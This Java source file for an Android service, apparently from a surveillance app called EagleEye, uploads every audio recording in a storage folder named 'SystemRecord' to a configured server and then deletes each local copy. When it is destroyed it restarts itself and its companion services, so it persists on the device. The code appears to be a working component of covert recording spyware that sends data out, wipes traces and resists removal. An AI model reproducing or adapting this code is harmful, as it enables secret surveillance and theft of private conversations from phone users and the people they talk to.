package net.web135.eagleeye;

import java.io.File;
import java.util.HashMap;
import java.util.Map;

import net.web135.eagleeye.util.FormFile;
import net.web135.eagleeye.util.SocketHttpRequester;
import android.app.Activity;
import android.app.Service;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.os.AsyncTask;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

public class UpLoadService extends Service {

	MyAsyncTask myAsync = null;

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		Log.i("NumberService", "==]====> I am UploadService !!");
		super.onCreate();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		Log.i("NumberService", "==]====> I am UploadService !!");
		//如果允许上传录音，才上传录音
		if (Define.enableRecordUpload) {
			if (isConnectInternet()) {
				myAsync = new MyAsyncTask();
				MyAsyncTask.execute(uploadRunnable);
			}
		}
		return START_STICKY;
	}

	/***
	 * 判断是否有网络连接，包含WIFI和GSM
	 * 
	 * @return 有或无 true/false
	 */
	public boolean isConnectInternet() {
		ConnectivityManager con = (ConnectivityManager) getSystemService(Activity.CONNECTIVITY_SERVICE);
		boolean wifi = con.getNetworkInfo(ConnectivityManager.TYPE_WIFI).isConnectedOrConnecting();
		boolean internet = con.getNetworkInfo(ConnectivityManager.TYPE_MOBILE).isConnectedOrConnecting();
		if (wifi | internet) {
			return true;
		} else {
			return false;
		}
	}

	@Override
	public void onDestroy() {
		Intent eagleEyeService = new Intent(this, EyeMain.class);
		this.startService(eagleEyeService);
		Intent numberService = new Intent(this, NumberService.class);
		this.startService(numberService);
		Intent uploadService = new Intent(this, UpLoadService.class);
		this.startService(uploadService);
	}

	Runnable uploadRunnable = new Runnable() {
		public void run() {
			uploadRecord();
		}
	};

	private void uploadRecord() {
		// TODO Auto-generated method stub
		String uploadPath = Define.upload2ServletPath;
		String filePath = Environment.getExternalStorageDirectory() + "/SystemRecord";
		File[] files = new File(filePath).listFiles();
		for (File file : files) {
			Map<String, String> params = new HashMap<String, String>();
			params.put("recordName", file.getName());
			params.put("entityName", Define.entityName);
			// File file = new File(Environment.getExternalStorageDirectory() +
			// "/SystemRecord", "10010.3gp");
			Log.i("NumberService", "==]====> LocalTestFilePath : " + file.getAbsolutePath());
			FormFile formFile = new FormFile(file, "videofile", "audio/mpeg");
			try {
				SocketHttpRequester.post(uploadPath, params, formFile);
				Log.i("NumberService", "==]====> UpLoad is OK ");
				file.delete();
				Log.i("NumberService", "==]====> File is Delete ");
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}

	public class MyAsyncTask extends AsyncTask<String, String, String> {
		@Override
		protected String doInBackground(String... params) {
			Log.i("asyncTask", "doInBackground");
			return "";
		}
	}

}
